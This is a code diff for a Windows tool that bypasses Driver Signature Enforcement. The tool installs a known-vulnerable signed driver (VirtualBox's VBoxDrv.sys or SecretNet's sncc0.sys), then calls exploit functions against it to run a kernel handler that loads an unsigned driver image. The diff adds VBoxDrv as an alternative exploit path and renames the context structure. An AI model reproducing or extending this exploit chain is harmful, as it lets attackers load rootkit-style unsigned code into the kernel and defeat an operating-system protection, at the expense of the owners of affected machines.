@@ -7,10 +7,19 @@
     Name and path for vulnerable driver that will
     be installed for DSE bypass.
 */
+#ifdef USE_VBOX
+
+#define VULN_DRIVER_FILE_NAME "VBoxDrv.sys"
+#define VULN_SERVICE_NAME "VBoxDrv"
+
+#else USE_SECRETNET
+
 #define VULN_DRIVER_FILE_NAME "sncc0.sys"
 #define VULN_SERVICE_NAME "sncc0"
 
-typedef struct _KERNEL_EXPL_CONTEXT
+#endif
+
+typedef struct _LOAD_DRIVER_CONTEXT
 {
     // information about source image
     PVOID Data;
@@ -26,8 +35,8 @@ typedef struct _KERNEL_EXPL_CONTEXT
     func_ExFreePoolWithTag f_ExFreePoolWithTag;
     func_IoCreateDriver f_IoCreateDriver;    
 
-} KERNEL_EXPL_CONTEXT,
-*PKERNEL_EXPL_CONTEXT;
+} LOAD_DRIVER_CONTEXT,
+*PLOAD_DRIVER_CONTEXT;
 
 extern "C"
 {
@@ -37,7 +46,7 @@ void kernel_expl_handler(void *context);
 //--------------------------------------------------------------------------------------
 void kernel_expl_handler(void *context)
 {
-    PKERNEL_EXPL_CONTEXT pContext = (PKERNEL_EXPL_CONTEXT)context;
+    PLOAD_DRIVER_CONTEXT pContext = (PLOAD_DRIVER_CONTEXT)context;
 
     PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
         pContext->Data, 
@@ -118,7 +127,7 @@ end:
 bool kernel_expl_load_driver(void *data, unsigned int size)
 {
     bool ret = false;
-    KERNEL_EXPL_CONTEXT context;
+    LOAD_DRIVER_CONTEXT context;
     
     context.Data = data;
     context.DataSize = size;
@@ -163,7 +172,15 @@ bool kernel_expl_load_driver(void *data, unsigned int size)
         BOOL bUnload = InfLoadDriver(VULN_SERVICE_NAME, szDestPath);        
 
         // run exploit
+#ifdef USE_VBOX
+
+        expl_VBoxDrv(kernel_expl_handler, &context);
+
+#else USE_SECRETNET
+
         expl_SNCC0_Sys_220010(kernel_expl_handler, &context);
+
+#endif
 
         if (bUnload)
         {
